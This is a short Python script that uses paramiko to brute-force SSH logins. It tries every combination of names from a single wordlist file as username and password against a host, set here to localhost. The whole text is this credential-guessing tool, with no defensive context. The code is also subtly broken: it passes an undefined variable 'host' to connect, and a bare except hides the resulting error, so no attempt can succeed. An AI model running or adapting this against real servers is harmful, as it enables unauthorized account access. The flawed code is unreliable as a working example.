import paramiko
import time

def brute(ip, port, user, password):
    client = paramiko.client.SSHClient()
    client.set_missing_host_key_policy(paramiko.client.AutoAddPolicy())
    try:
        client.connect(host, port=port, username=user, password=password)
        print(f'Credentials found: {user}:{password}')
    except:
        pass

def main():
    ip = 'localhost'
    port = 22
    f = open('users_password.txt', 'r')
    users = f.read().split('\n')
    pwds = users.copy()
    f.close()

    for user in users:
        for pwd in pwds:
            brute(ip, port, user, pwd)

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        exit()